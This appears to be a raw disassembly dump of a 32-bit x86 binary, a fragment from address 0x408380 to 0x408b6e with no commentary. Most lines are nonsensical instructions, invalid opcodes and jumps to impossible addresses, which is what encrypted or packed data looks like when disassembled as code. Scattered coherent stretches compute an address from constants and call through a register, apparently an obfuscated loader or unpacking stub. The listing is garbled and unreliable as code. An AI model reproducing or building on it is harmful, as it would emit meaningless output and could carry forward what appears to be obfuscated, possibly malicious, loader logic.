  408380:	bound  ebx,QWORD PTR [ebx]
  408382:	nop
  408383:	push   cs
  408384:	or     DWORD PTR [esi-0x14],esp
  408387:	cwde   
  408388:	fisttp QWORD PTR [eax]
  40838a:	dec    ebx
  40838b:	mov    al,0x54
  40838d:	mov    eax,ds:0xdbfa0ad2
  408392:	jmp    0xa57ca496
  408397:	mov    eax,0x5bdc6d7d
  40839c:	in     eax,dx
  40839d:	aaa    
  40839e:	sar    DWORD PTR ds:[eax],cl
  4083a1:	xor    eax,esp
  4083a3:	xor    BYTE PTR [edi-0x66],bh
  4083a6:	(bad)  
  4083a7:	aad    0x6a
  4083a9:	mov    al,0x5f
  4083ab:	mov    ebp,0x2cc16251
  4083b0:	or     ecx,ebp
  4083b2:	or     ebx,esp
  4083b4:	jmp    0x408359
  4083b6:	pop    edx
  4083b7:	push   esp
  4083b8:	fisubr WORD PTR [ecx+0x326ea03b]
  4083be:	mov    ch,BYTE PTR [ebx+ebp*1]
  4083c1:	dec    eax
  4083c2:	jmp    0xfb00:0xbdb0dfed
  4083c9:	xor    bh,dl
  4083cb:	psllw  mm1,QWORD PTR ds:0x1916f550
  4083d2:	xchg   ebp,eax
  4083d3:	mov    ebp,0x4b98871d
  4083d8:	dec    ebx
  4083d9:	je     0x40842d
  4083db:	adc    DWORD PTR [edi-0x6c],0x19b324bf
  4083e2:	xlat   BYTE PTR ds:[ebx]
  4083e3:	adc    al,0xd5
  4083e5:	and    eax,0x81c8cb7c
  4083ea:	out    0xa3,eax
  4083ec:	repnz mov ebp,DWORD PTR [edx]
  4083ef:	mov    ebx,0xf1d8669d
  4083f4:	jp     0x40841f
  4083f6:	jne    0x40841f
  4083f8:	and    eax,0x87fd69aa
  4083fd:	mov    ds:0x68e7dace,al
  408402:	pop    ds
  408403:	pop    ebp
  408404:	jb     0x408441
  408406:	jmp    0xaee358f8
  40840b:	shl    DWORD PTR [esi-0x639bacdb],1
  408411:	pop    ebp
  408412:	(bad)  [edi-0x4046544e]
  408418:	mov    eax,0x177ee15
  40841d:	mov    bh,0x0
  40841f:	jg     0x4083ba
  408421:	jmp    0x40848c
  408423:	jae    0x40849a
  408425:	push   esi
  408426:	fwait
  408427:	dec    eax
  408428:	sti    
  408429:	inc    esp
  40842a:	int3   
  40842b:	lahf   
  40842c:	rol    DWORD PTR [edi-0x6bd1aec5],0xf9
  408433:	inc    edi
  408434:	sub    eax,0xf0652d44
  408439:	dec    edi
  40843a:	lea    edx,[ebx-0x1b7f7c59]
  408440:	fistp  WORD PTR [eax-0x40afe677]
  408446:	and    DWORD PTR [ecx],esp
  408448:	mov    DWORD PTR [eax],ebx
  40844a:	dec    DWORD PTR [eax+0x39]
  40844d:	loop   0x408422
  40844f:	pop    ss
  408450:	push   esi
  408451:	shl    DWORD PTR [eax+0x7c],cl
  408454:	push   ebx
  408455:	test   DWORD PTR [esi],ebp
  408457:	jne    0x40842c
  408459:	dec    edx
  40845a:	mov    al,0x44
  40845c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40845d:	sub    al,0x41
  40845f:	sbb    edx,DWORD PTR [ebx+eiz*1+0x14]
  408463:	inc    eax
  408464:	mov    ecx,gs
  408466:	sbb    eax,DWORD PTR [ebx]
  408468:	pusha  
  408469:	xlat   BYTE PTR ss:[ebx]
  40846b:	xchg   edi,eax
  40846c:	dec    edx
  40846d:	inc    edi
  40846e:	mov    DWORD PTR [ecx-0x47126e1a],edi
  408474:	mul    bh
  408476:	mov    al,ds:0x64404e80
  40847b:	xchg   esp,eax
  40847c:	dec    ebp
  40847d:	pop    ds
  40847e:	in     al,0x33
  408480:	shr    ecx,0x84
  408483:	add    DWORD PTR [eax],eax
  408485:	add    BYTE PTR [ebx],ch
  408487:	or     bl,bh
  408489:	je     0x408486
  40848b:	out    0xfb,eax
  40848d:	sub    ecx,DWORD PTR [ebp+0x6c2c4c8b]
  408493:	jecxz  0x4084f4
  408495:	(bad)  
  408496:	fistp  QWORD PTR [edi]
  408498:	jl     0x408516
  40849a:	call   0x38bd011e
  40849f:	xor    edx,DWORD PTR [eax]
  4084a1:	mov    esi,0xaf6c917a
  4084a6:	mov    esi,DWORD PTR [eax]
  4084a8:	pop    edi
  4084a9:	nop
  4084aa:	ins    BYTE PTR es:[edi],dx
  4084ab:	or     DWORD PTR [ecx],edx
  4084ad:	fild   DWORD PTR ds:0x9b8ed3c3
  4084b3:	call   0xac82c07
  4084b8:	test   DWORD PTR [ecx+0x753bbc4f],eax
  4084be:	hlt    
  4084bf:	gs je  0x4084d2
  4084c2:	cwde   
  4084c3:	fist   DWORD PTR [esi+0x361da5d0]
  4084c9:	xchg   esi,eax
  4084ca:	push   esi
  4084cb:	inc    esi
  4084cc:	fstp   QWORD PTR ds:0x1154d71f
  4084d2:	js     0x408521
  4084d4:	loop   0x408528
  4084d6:	push   ss
  4084d7:	test   eax,0x8f6b6680
  4084dc:	sub    bh,BYTE PTR [ebx-0x7cef1194]
  4084e2:	repnz mov ds:0x222403ae,al
  4084e8:	push   ebp
  4084e9:	lds    eax,FWORD PTR [edi+0x778dcb29]
  4084ef:	jae    0x4084c1
  4084f1:	pop    ebx
  4084f2:	and    ecx,DWORD PTR [edi+0x23aa9efa]
  4084f8:	out    dx,al
  4084f9:	mov    ebp,eax
  4084fb:	cmp    eax,0x922dcae
  408500:	or     eax,0xfebb46a7
  408505:	ret    0xf8e6
  408508:	(bad)  
  408509:	fiadd  WORD PTR [ecx-0x120c7d66]
  40850f:	sbb    DWORD PTR [ebx-0x60],0x771d62e5
  408516:	out    dx,eax
  408517:	pop    ds
  408518:	daa    
  408519:	ins    BYTE PTR es:[edi],dx
  40851a:	mov    ds:0x74faf3b5,eax
  40851f:	out    0x32,al
  408521:	sub    al,0xb
  408523:	inc    eax
  408524:	retf   0x32e5
  408527:	jae    0x4084c0
  408529:	in     al,dx
  40852a:	hlt    
  40852b:	in     eax,0x1
  40852d:	div    BYTE PTR [ebp-0x180e79ad]
  408533:	pop    ecx
  408534:	imul   ebx,DWORD PTR [ebp-0x54],0xfffffffd
  408538:	into   
  408539:	xchg   ebx,eax
  40853a:	test   DWORD PTR [ecx-0x716ae487],esi
  408540:	mov    ebp,0x131ffb4d
  408545:	dec    ebp
  408546:	fsub   QWORD PTR [esi]
  408548:	xchg   ecx,eax
  408549:	retf   0xdb44
  40854c:	popa   
  40854d:	hlt    
  40854e:	inc    ecx
  40854f:	fs push 0xffffffea
  408552:	fdecstp 
  408554:	xchg   ecx,eax
  408555:	cmp    edi,eax
  408557:	or     eax,0x5a02e0d9
  40855c:	mov    ecx,0xf86e0e7c
  408561:	add    al,0x59
  408563:	jbe    0x408577
  408565:	fadd   QWORD PTR [ebp+edx*1+0x50]
  408569:	sub    al,0x9c
  40856b:	(bad)  
  40856c:	into   
  40856d:	sti    
  40856e:	jecxz  0x408595
  408570:	or     DWORD PTR [edi+eax*1-0x7f6fe4d],edi
  408577:	(bad)  
  408578:	call   0x6d085a9e
  40857d:	or     BYTE PTR [edx+0x31],bh
  408580:	cs push ebx
  408582:	mov    al,ds:0xbbae4ac3
  408587:	into   
  408588:	jnp    0x4085bd
  40858a:	popf   
  40858b:	xchg   DWORD PTR [eax-0x4ca28dfe],ebp
  408591:	sub    al,0x46
  408593:	or     eax,0x9e4a57fc
  408598:	imul   ebp,DWORD PTR [ecx],0xfd766e06
  40859e:	pop    ebp
  40859f:	cmp    DWORD PTR [eax+0x42a85ee],edx
  4085a5:	mov    dh,0x68
  4085a7:	pop    edi
  4085a8:	(bad)  
  4085a9:	retf   
  4085aa:	outs   dx,DWORD PTR ds:[esi]
  4085ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ac:	enter  0xe657,0x5c
  4085b0:	mov    edi,0x8309500d
  4085b5:	cli    
  4085b6:	or     bl,dh
  4085b8:	call   0x7dfd:0x18d4e92f
  4085bf:	xchg   ebp,eax
  4085c0:	pop    ecx
  4085c1:	or     eax,0xb568e261
  4085c6:	adc    cl,BYTE PTR [ebx+0x20079f83]
  4085cc:	icebp  
  4085cd:	jge    0x408567
  4085cf:	mov    edx,0x1bdc3025
  4085d4:	pushf  
  4085d5:	jno    0x40859c
  4085d7:	xor    esi,DWORD PTR [ebp+0xf8cbc99]
  4085dd:	pop    eax
  4085de:	cli    
  4085df:	mov    esi,0xdaf39f1e
  4085e4:	dec    esp
  4085e5:	cli    
  4085e6:	xchg   edx,eax
  4085e7:	dec    esi
  4085e8:	scas   al,BYTE PTR es:[edi]
  4085e9:	ins    BYTE PTR es:[edi],dx
  4085ea:	jecxz  0x4085bb
  4085ec:	(bad)  
  4085ed:	mov    dh,0x8f
  4085ef:	inc    eax
  4085f0:	cmp    eax,0x3ba87af9
  4085f5:	and    al,0x51
  4085f7:	or     edx,DWORD PTR [edx-0x124c0390]
  4085fd:	data16 (bad) 
  4085ff:	jo     0x40861b
  408601:	fidiv  WORD PTR [eax-0x6c5ca669]
  408607:	mov    WORD PTR [edx-0x17],?
  40860a:	add    eax,esi
  40860c:	imul   eax,DWORD PTR [edx]
  40860f:	mov    edx,DWORD PTR [ebp-0x4]
  408612:	xor    edx,ecx
  408614:	mov    ecx,DWORD PTR [ebp+0x8]
  408617:	lea    ecx,[edx+ecx*1+0x32729e]
  40861e:	cmp    ecx,eax
  408620:	jmp    0x4087a9
  408625:	test   DWORD PTR [edi],esp
  408627:	in     al,dx
  408628:	iret   
  408629:	jp     0x4085f2
  40862b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	jge    0x4085fc
  40862e:	(bad)  
  40862f:	loope  0x408624
  408631:	or     al,0x7a
  408633:	inc    eax
  408634:	push   edx
  408635:	dec    ebx
  408636:	ds jl  0x4086b5
  408639:	call   0xd2bd02bd
  40863e:	in     eax,0xba
  408640:	addr16 in eax,0xbd
  408643:	fcomp  QWORD PTR [ebx+0x58]
  408646:	test   eax,0x4643ca6
  40864b:	lea    eax,[esi]
  40864d:	mov    cl,0xa7
  40864f:	jle    0x408608
  408651:	mov    ebx,0x156d58e6
  408656:	cdq    
  408657:	or     edx,DWORD PTR [edi-0x3d]
  40865a:	dec    ebp
  40865b:	push   0xbab5fc6c
  408660:	pop    ss
  408661:	ins    BYTE PTR es:[edi],dx
  408662:	mov    ch,0x86
  408664:	push   edx
  408665:	int    0x4a
  408667:	and    al,BYTE PTR [ebx]
  408669:	cdq    
  40866a:	mov    ah,ah
  40866c:	pop    es
  40866d:	sub    BYTE PTR [edx-0x33c35677],bl
  408673:	inc    BYTE PTR [edi-0x24]
  408676:	ins    BYTE PTR es:[edi],dx
  408677:	jmp    0x9353322e
  40867c:	scas   al,BYTE PTR es:[edi]
  40867d:	not    BYTE PTR [esi-0x3e]
  408680:	ins    DWORD PTR es:[edi],dx
  408681:	sub    eax,DWORD PTR [edi-0x3c]
  408684:	nop
  408685:	in     eax,dx
  408686:	out    0xae,al
  408688:	aad    0x58
  40868a:	mov    dh,0xb6
  40868c:	in     eax,dx
  40868d:	popf   
  40868e:	dec    edx
  40868f:	xchg   edi,ecx
  408691:	xchg   esi,eax
  408692:	push   edx
  408693:	inc    edi
  408694:	shl    BYTE PTR [edi-0x2fa3197a],cl
  40869a:	push   ebp
  40869b:	xchg   DWORD PTR [esi-0x6a],edi
  40869e:	pop    ds
  40869f:	pusha  
  4086a0:	mov    esp,0x8964f63a
  4086a5:	hlt    
  4086a6:	scas   al,BYTE PTR es:[edi]
  4086a7:	stos   DWORD PTR es:[edi],eax
  4086a8:	in     eax,0xee
  4086aa:	mov    ecx,0x47ecfddc
  4086af:	les    esp,FWORD PTR [ebp+ebp*4+0x531ba6a7]
  4086b6:	xchg   esi,eax
  4086b7:	cmp    BYTE PTR [eax-0x209f28bb],cl
  4086bd:	arpl   WORD PTR [ebp+0x3f325eb9],ax
  4086c3:	bound  esp,QWORD PTR [edx+edx*8-0x218cc484]
  4086ca:	xchg   BYTE PTR [edi+0x6a],al
  4086cd:	(bad)  
  4086cf:	lock mov al,0x53
  4086d2:	mov    eax,0x6a93031f
  4086d7:	in     al,dx
  4086d8:	stos   BYTE PTR es:[edi],al
  4086d9:	std    
  4086da:	test   al,0xf9
  4086dc:	xchg   edx,eax
  4086dd:	mov    ebp,0xc2132358
  4086e2:	jmp    DWORD PTR [edx+0xa67cc82]
  4086e8:	inc    ebx
  4086e9:	xchg   ecx,eax
  4086ea:	rcl    eax,0x60
  4086ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ee:	(bad)  
  4086ef:	adc    esp,edx
  4086f1:	iret   
  4086f2:	fsub   DWORD PTR [ebx-0x58]
  4086f5:	pop    eax
  4086f6:	jnp    0x408692
  4086f8:	inc    edi
  4086f9:	je     0x408719
  4086fb:	pop    esp
  4086fc:	inc    edi
  4086fd:	mov    al,0xf1
  4086ff:	cdq    
  408700:	xchg   ebp,eax
  408701:	xchg   ebp,eax
  408702:	lods   eax,DWORD PTR ds:[esi]
  408703:	rcr    BYTE PTR [edx+0x1b4a718c],cl
  408709:	sbb    ah,BYTE PTR ds:0xbd1b267f
  40870f:	shl    DWORD PTR [esi+0xb55836e],1
  408715:	je     0x408747
  408717:	retf   0xc53e
  40871a:	mov    dh,0x15
  40871c:	std    
  40871d:	xchg   DWORD PTR [esi+0x6c],ebx
  408720:	dec    esp
  408721:	sbb    BYTE PTR [ebp-0x22bfb576],ah
  408727:	mov    ds:0xae81da8f,eax
  40872c:	aam    0x7c
  40872e:	outs   dx,BYTE PTR ds:[esi]
  40872f:	or     al,0x1f
  408731:	leave  
  408732:	es dec ebp
  408734:	ret    
  408735:	fld    TBYTE PTR [edi]
  408737:	dec    ecx
  408738:	call   0xbb04aa6f
  40873d:	sbb    eax,0xb52cf7a2
  408742:	jb     0x4087a0
  408744:	mov    BYTE PTR [ebx-0x20960dc0],dl
  40874a:	pop    ecx
  40874b:	inc    edi
  40874c:	punpckhbw mm7,mm2
  40874f:	ror    BYTE PTR ds:0x96b6b8e9,1
  408755:	adc    edx,DWORD PTR [edx+eiz*2-0x7f]
  408759:	fisttp QWORD PTR [edi-0x67f8f778]
  40875f:	inc    ebp
  408760:	cmp    dh,BYTE PTR [ecx-0x6d5e17b5]
  408766:	in     eax,0x5a
  408768:	push   edx
  408769:	dec    edi
  40876a:	aad    0x2e
  40876c:	xchg   esp,eax
  40876d:	pop    esp
  40876e:	adc    BYTE PTR [ecx+0xdef3836],bh
  408774:	pop    ecx
  408775:	iret   
  408776:	test   BYTE PTR [eax],ch
  408778:	sub    al,0x81
  40877a:	xchg   BYTE PTR [ecx-0x29],bl
  40877d:	push   ebx
  40877e:	fimul  DWORD PTR [ebx-0x1117989d]
  408784:	aas    
  408785:	stos   DWORD PTR es:[edi],eax
  408786:	icebp  
  408787:	fist   WORD PTR [esi]
  408789:	add    DWORD PTR [ebp-0x66],0xdf465f4e
  408790:	mov    eax,0xe8c75e4d
  408795:	test   eax,0xdad0dac3
  40879a:	cmp    ebp,DWORD PTR ds:0x7bce2ce
  4087a0:	test   DWORD PTR [ebp-0x370034bb],esp
  4087a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087a7:	cs pop ebp
  4087a9:	jne    0x407f98
  4087af:	mov    ebx,esi
  4087b1:	jmp    0x4087bb
  4087b6:	mov    ebx,0x32729e
  4087bb:	mov    eax,DWORD PTR [ebp-0x4]
  4087be:	xor    eax,0x7510857
  4087c3:	add    eax,ebx
  4087c5:	mov    DWORD PTR [ebp-0xc],eax
  4087c8:	xor    ebx,ebx
  4087ca:	lea    eax,[ebp-0x10]
  4087cd:	add    ebx,DWORD PTR [eax]
  4087cf:	call   ebx
  4087d1:	xor    ebx,ebx
  4087d3:	inc    ebx
  4087d4:	cmp    DWORD PTR [ebp+0x10],ebx
  4087d7:	je     0x40897e
  4087dd:	xchg   edx,eax
  4087de:	push   0xa
  4087e0:	pop    ecx
  4087e1:	push   0x4
  4087e3:	pop    ebx
  4087e4:	inc    ebx
  4087e5:	xchg   ebx,ecx
  4087e7:	sub    ebx,ecx
  4087e9:	xchg   ebx,ecx
  4087eb:	dec    ecx
  4087ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4087ef:	jmp    0x408978
  4087f4:	hlt    
  4087f5:	jecxz  0x4087ee
  4087f7:	dec    esi
  4087f8:	jnp    0x408874
  4087fa:	pop    ecx
  4087fb:	std    
  4087fc:	sahf   
  4087fd:	retf   0x4846
  408800:	xlat   BYTE PTR ds:[ebx]
  408801:	rcr    BYTE PTR [eax],cl
  408803:	sub    DWORD PTR [edi],esp
  408805:	xor    BYTE PTR [esp+edi*2-0x18],bh
  408809:	jg     0x408887
  40880b:	jl     0x4087af
  40880d:	pop    edx
  40880e:	pop    es
  40880f:	inc    esp
  408810:	xchg   esp,eax
  408811:	ss stos BYTE PTR es:[edi],al
  408813:	fdiv   DWORD PTR [esi]
  408815:	and    esp,DWORD PTR [ebx-0x17543f17]
  40881b:	sub    eax,0xe08a48e7
  408820:	aad    0xbf
  408822:	sbb    ebx,DWORD PTR [eax-0x5f87bcb1]
  408828:	clc    
  408829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40882a:	sub    al,0xa2
  40882c:	mov    eax,0xc901c86d
  408831:	xor    bl,BYTE PTR gs:[eax-0x704335bc]
  408838:	xchg   ecx,eax
  408839:	xchg   edi,eax
  40883a:	xor    bl,bh
  40883c:	push   DWORD PTR [ebx+ebp*2+0x44]
  408840:	xchg   edx,eax
  408841:	out    dx,al
  408842:	and    dh,dl
  408844:	std    
  408845:	push   ebp
  408846:	outs   dx,BYTE PTR ds:[esi]
  408847:	mov    al,0x8
  408849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40884a:	adc    BYTE PTR [ebp+0x47],al
  40884d:	inc    ebx
  40884e:	std    
  40884f:	out    0xdc,eax
  408851:	out    dx,al
  408852:	or     eax,0xfb565d50
  408857:	jns    0x40881e
  408859:	xchg   ebx,eax
  40885a:	add    dh,BYTE PTR [edi-0x63c92c01]
  408860:	mov    bh,0xfc
  408862:	ret    
  408863:	inc    esi
  408864:	jmp    0x40880d
  408866:	lea    ebx,[ecx]
  408868:	jp     0x4088ae
  40886a:	mov    eax,0x3f41c4e3
  40886f:	in     al,dx
  408870:	les    eax,FWORD PTR [ebx]
  408872:	outs   dx,DWORD PTR ds:[esi]
  408873:	jmp    0xd3e98b00
  408878:	xchg   ecx,eax
  408879:	adc    al,0xff
  40887b:	mov    dh,BYTE PTR [eax-0xa6a6a9c]
  408881:	sti    
  408882:	imul   esp,DWORD PTR [edx+0x161c381f],0xffffffb6
  408889:	enter  0x73c8,0xdd
  40888d:	push   ss
  40888e:	or     BYTE PTR [esi-0x38],dh
  408891:	int    0x4f
  408893:	loopne 0x408873
  408895:	ins    BYTE PTR es:[edi],dx
  408896:	and    DWORD PTR [ecx+eiz*1],ebx
  408899:	ret    0xa97c
  40889c:	add    edx,DWORD PTR [ecx]
  40889e:	out    0x94,al
  4088a0:	rol    ebx,cl
  4088a2:	add    ah,bh
  4088a4:	call   0x20b728e2
  4088a9:	add    al,0x25
  4088ab:	mov    cl,0x4e
  4088ad:	pop    ss
  4088ae:	out    0x2a,eax
  4088b0:	sar    BYTE PTR [esi],cl
  4088b2:	push   ebx
  4088b3:	inc    edx
  4088b4:	fstp   TBYTE PTR [esi-0x6f2ca0be]
  4088ba:	xor    DWORD PTR [esi-0x42c28c00],edx
  4088c0:	jo     0x40886d
  4088c2:	les    esi,FWORD PTR [eax+eax*8+0x59fcf87b]
  4088c9:	shl    dh,1
  4088cb:	pop    esp
  4088cc:	push   edx
  4088cd:	or     al,0x19
  4088cf:	adc    ebx,DWORD PTR [eax+0x4c]
  4088d2:	dec    edx
  4088d3:	sbb    edx,DWORD PTR [eax]
  4088d5:	out    0xbe,al
  4088d7:	xor    DWORD PTR [edx*2-0x3bef2f7d],0xb849c59b
  4088e2:	add    eax,0x86678c66
  4088e7:	mov    cl,0xe8
  4088e9:	jmp    0xb062:0xc4478d4d
  4088f0:	inc    esp
  4088f1:	and    al,0xf1
  4088f3:	shl    DWORD PTR [bp+si-0x3b],0x83
  4088f8:	xchg   esi,eax
  4088f9:	push   0xffffffd1
  4088fb:	sar    BYTE PTR [ebp-0x6129a45],cl
  408901:	fisttp WORD PTR [ebx+esi*4+0x11]
  408905:	inc    ebp
  408906:	scas   al,BYTE PTR es:[edi]
  408907:	lahf   
  408908:	mov    eax,ds:0x82895993
  40890d:	shl    DWORD PTR fs:[edi-0x6e],1
  408911:	add    bl,ah
  408913:	dec    eax
  408914:	sub    BYTE PTR gs:[edi+0x42],al
  408918:	popf   
  408919:	push   ss
  40891a:	inc    edx
  40891b:	cmc    
  40891c:	ret    
  40891d:	jbe    0x4088db
  40891f:	sub    eax,0xb701ee11
  408924:	das    
  408925:	push   esi
  408926:	fnstenv [edx-0x1]
  408929:	jne    0x408928
  40892b:	sar    BYTE PTR [edi-0x186e8c11],cl
  408931:	inc    esp
  408932:	push   ds
  408933:	and    BYTE PTR [ecx-0x293b4ba2],bl
  408939:	mov    eax,0x167d7e6e
  40893e:	push   ss
  40893f:	xchg   ebx,eax
  408940:	inc    BYTE PTR [ecx]
  408942:	mov    ah,0xf4
  408944:	adc    esi,DWORD PTR [edi-0x25187574]
  40894a:	sbb    eax,0x975ac013
  40894f:	fwait
  408950:	ins    DWORD PTR es:[edi],dx
  408951:	xchg   esp,eax
  408952:	lea    edx,[ecx]
  408954:	or     dh,BYTE PTR [ebx+ebx*8+0x38]
  408958:	xor    DWORD PTR [edi-0x70],ebx
  40895b:	xchg   ebp,eax
  40895c:	aam    0x20
  40895e:	pushf  
  40895f:	pop    esi
  408960:	push   ebx
  408961:	push   0x68
  408963:	into   
  408964:	xchg   ebx,eax
  408965:	call   0x69b6:0xe5ee2e36
  40896c:	pop    ecx
  40896d:	cmp    DWORD PTR [edi-0xfe0b709],esi
  408973:	inc    esp
  408974:	aas    
  408975:	pusha  
  408976:	sub    ebp,DWORD PTR [edi+ecx*1-0x1ffc3e51]
  40897d:	xchg   edx,eax
  40897e:	push   eax
  40897f:	xor    ebx,ebx
  408981:	mov    edx,esp
  408983:	dec    edx
  408984:	jmp    0x408b0d
  408989:	xchg   BYTE PTR [edx+0x456bbe5f],ah
  40898f:	mov    ecx,0xfaf08d7a
  408994:	mov    esi,0x56e187fe
  408999:	xchg   ebx,eax
  40899a:	xor    edi,DWORD PTR [esp+edi*2-0x18]
  40899e:	jg     0x408a1c
  4089a0:	jl     0x408970
  4089a2:	xor    DWORD PTR ds:0x28f7e031,ebx
  4089a8:	xor    BYTE PTR [ecx],bl
  4089aa:	pop    ebp
  4089ab:	int    0x5e
  4089ad:	fidiv  WORD PTR [edx+0x377e2a0d]
  4089b3:	and    ecx,esi
  4089b5:	ret    
  4089b6:	(bad)  
  4089b7:	jne    0x408a19
  4089b9:	sbb    ah,cl
  4089bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bc:	sahf   
  4089bd:	dec    ebp
  4089be:	jae    0x4089e7
  4089c0:	fidiv  DWORD PTR [edi-0xc5a4924]
  4089c6:	imul   edi,DWORD PTR [ebx-0x46],0xc46f2385
  4089cd:	mov    ch,0xb3
  4089cf:	cmp    BYTE PTR [ebx],al
  4089d1:	ja     0x4089b5
  4089d3:	das    
  4089d4:	push   es
  4089d5:	pushf  
  4089d6:	cmovg  edx,DWORD PTR [edx+ebp*2]
  4089da:	cwde   
  4089db:	dec    edi
  4089dc:	pop    ebp
  4089dd:	call   0x930b:0xc8b20366
  4089e4:	or     DWORD PTR [eax+0x30],eax
  4089e7:	daa    
  4089e8:	adc    DWORD PTR [eax-0x5f],0xd
  4089ec:	test   al,0xb1
  4089ee:	push   0xffffff8e
  4089f0:	in     al,dx
  4089f1:	and    al,0xb4
  4089f3:	out    dx,al
  4089f4:	fdiv   QWORD PTR [eax]
  4089f6:	add    DWORD PTR [edi-0x1ed456d6],esp
  4089fc:	push   ebp
  4089fd:	outs   dx,BYTE PTR ds:[esi]
  4089fe:	mov    ch,0x72
  408a00:	push   esi
  408a01:	or     al,0x8c
  408a03:	push   ebp
  408a04:	xchg   esi,eax
  408a05:	mov    dh,0x7e
  408a07:	dec    esi
  408a08:	push   esp
  408a09:	ins    DWORD PTR es:[edi],dx
  408a0a:	xor    bl,cl
  408a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a0d:	fimul  DWORD PTR [esi-0x65c0fe11]
  408a13:	mov    cl,al
  408a15:	mov    ds,WORD PTR [ebx+0x577cf243]
  408a1b:	sti    
  408a1c:	out    0xda,al
  408a1e:	or     BYTE PTR ds:0xa27f8b35,ch
  408a24:	(bad)  
  408a25:	stc    
  408a26:	dec    edx
  408a27:	(bad)  
  408a28:	push   ds
  408a29:	sbb    ah,ch
  408a2b:	pop    es
  408a2c:	ja     0x408a1f
  408a2e:	psrlq  mm5,QWORD PTR [edi-0x10a72055]
  408a35:	inc    eax
  408a36:	test   eax,0xc7bc750e
  408a3b:	clc    
  408a3c:	frstor [edi+edi*2-0x703d2f10]
  408a43:	push   edi
  408a44:	(bad)  
  408a45:	cwde   
  408a46:	and    BYTE PTR [esi-0x74cc34fb],dh
  408a4c:	push   cs
  408a4d:	and    edx,DWORD PTR [eax+0x839f572]
  408a53:	das    
  408a54:	addr16 xchg ecx,eax
  408a56:	div    BYTE PTR [ebp+ecx*8-0x523943fc]
  408a5d:	xchg   edi,eax
  408a5e:	or     al,0x30
  408a60:	cmp    eax,0xa494b0cf
  408a65:	mov    edx,0x9d9a81c9
  408a6a:	ror    BYTE PTR [eax-0x18],0x37
  408a6e:	inc    esp
  408a6f:	stos   BYTE PTR es:[edi],al
  408a70:	add    eax,0xc4feb681
  408a75:	xor    ecx,DWORD PTR [esi-0x19]
  408a78:	fld    QWORD PTR [esi]
  408a7a:	sbb    BYTE PTR [eax+0xe],bl
  408a7d:	rcr    ebx,0xbc
  408a80:	popf   
  408a81:	pop    eax
  408a82:	(bad)  
  408a83:	inc    esp
  408a84:	icebp  
  408a85:	shl    DWORD PTR [edx-0x13],cl
  408a88:	jae    0x408a54
  408a8a:	fisubr DWORD PTR [eax+0xd78f2da]
  408a90:	pusha  
  408a91:	scas   al,BYTE PTR es:[edi]
  408a92:	int    0xd7
  408a94:	dec    edx
  408a95:	xor    dl,ch
  408a97:	in     eax,0xea
  408a99:	imul   esi,DWORD PTR [ecx],0xcabf0eb2
  408a9f:	mov    BYTE PTR [esi-0x72],0x82
  408aa3:	mov    al,0xf4
  408aa5:	aam    0x88
  408aa7:	lods   al,BYTE PTR ds:[esi]
  408aa8:	scas   eax,DWORD PTR es:[edi]
  408aa9:	or     ecx,DWORD PTR [eax]
  408aab:	pop    edx
  408aac:	lock sub eax,0x5f166c86
  408ab2:	dec    ecx
  408ab3:	or     BYTE PTR [ecx-0x39],bh
  408ab6:	mov    ds:0x73b6a0b1,al
  408abb:	mov    edi,0x205b9ba8
  408ac0:	add    bl,dh
  408ac2:	shl    DWORD PTR [ecx],0xad
  408ac5:	cld    
  408ac6:	mov    ah,0x96
  408ac8:	out    dx,eax
  408ac9:	adc    BYTE PTR [edi],dl
  408acb:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408acd:	int    0x6
  408acf:	(bad)
  408ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad3:	pusha  
  408ad4:	pop    edx
  408ad5:	adc    eax,ecx
  408ad7:	sti    
  408ad8:	mov    ds:0xdcee56cd,eax
  408add:	ins    BYTE PTR es:[edi],dx
  408ade:	mov    edi,0x2fc80ce8
  408ae3:	and    BYTE PTR [edx+0x606c057e],bl
  408ae9:	scas   eax,DWORD PTR es:[edi]
  408aea:	loope  0x408b49
  408aec:	pop    es
  408aed:	into   
  408aee:	loop   0x408a78
  408af0:	or     DWORD PTR [eax-0x19],edi
  408af3:	add    edi,DWORD PTR [ebp-0x7bf44796]
  408af9:	xor    BYTE PTR [edi+0xf],ah
  408afc:	imul   edx,DWORD PTR [ebx+edx*1-0x11],0xffffff92
  408b01:	ror    BYTE PTR [esi],cl
  408b03:	cli    
  408b04:	xor    DWORD PTR ds:0xbec2b73a,ebp
  408b0a:	(bad)  
  408b0b:	fisub  DWORD PTR [eax+0x43]
  408b0e:	add    ebx,DWORD PTR [edx+ebx*1]
  408b11:	dec    ebx
  408b12:	xor    edx,edx
  408b14:	add    DWORD PTR [ebp-0xc],ebx
  408b17:	pop    ebx
  408b18:	mov    eax,DWORD PTR [ebp-0xc]
  408b1b:	pop    edi
  408b1c:	jmp    0x408ca5
  408b21:	add    al,0xa8
  408b23:	retf   
  408b24:	mov    al,0x7b
  408b26:	push   ebx
  408b27:	xchg   DWORD PTR [eax-0x17],edi
  408b2a:	shl    ebx,1
  408b2c:	das    
  408b2d:	jge    0x408ba9
  408b2f:	pop    edx
  408b30:	inc    eax
  408b31:	sysexit 
  408b33:	jl     0x408bb1
  408b35:	call   0x31bd07b9
  408b3a:	xor    bl,BYTE PTR ds:0x4eabc760
  408b40:	inc    ecx
  408b41:	repnz mov ch,0x80
  408b44:	adc    eax,0xb8edca8c
  408b49:	lds    esi,FWORD PTR [edi]
  408b4b:	leave  
  408b4c:	mov    cl,0xd6
  408b4e:	enter  0x3131,0xb9
  408b52:	cs mov dl,0xae
  408b55:	push   edx
  408b56:	cmp    al,0x1c
  408b58:	stos   DWORD PTR es:[edi],eax
  408b59:	sub    eax,0x673ec438
  408b5e:	test   eax,0x8fb8439b
  408b63:	sbb    bl,al
  408b65:	and    DWORD PTR [ecx],esp
  408b67:	ftst   
  408b69:	mov    ebp,0x50bb3418
  408b6e:	mov    edi,0x19724e78
